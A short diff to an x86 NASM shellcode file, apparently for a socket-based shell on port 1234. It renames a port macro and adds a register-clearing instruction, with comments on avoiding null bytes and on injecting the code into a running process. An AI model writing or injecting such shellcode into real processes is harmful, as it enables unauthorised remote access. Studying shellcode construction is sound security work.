@@ -8,8 +8,8 @@
 
 ; this function allows you to specify port in human readable format 
 %define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
-%define _port 1234
-PORT equ htons(_port) 
+%define port 1234
+PORT equ htons(port) 
 ; this function is NOT injected in assembly by compiler, it is computed at build time 
 
 global _start 
@@ -25,6 +25,8 @@ _start:
 ; syscall "socket", with argument SYS_SOCKET create a fd, 0x1 in ebx 
 ; arguments to the call are PF_INET = AF_INET (2), SOCK_STREAM (1), IPPROTO_IP(0) in reverse order  
 ; here we use bl register instead of ebx because "mov ebx,0x1" contains null bytes, like this : b8 66 > 00 00 00 <   mov eax,0x66
+; we need to clean ebx register because when we inject it into process ebx often contains old data 
+xor ebx,ebx
 mov    bl,0x1
 ; the two next operands simply replace "push 0x0" which also contains a null byte, we will usually use xor x,x and push x to push 0x0  
 xor eax,eax
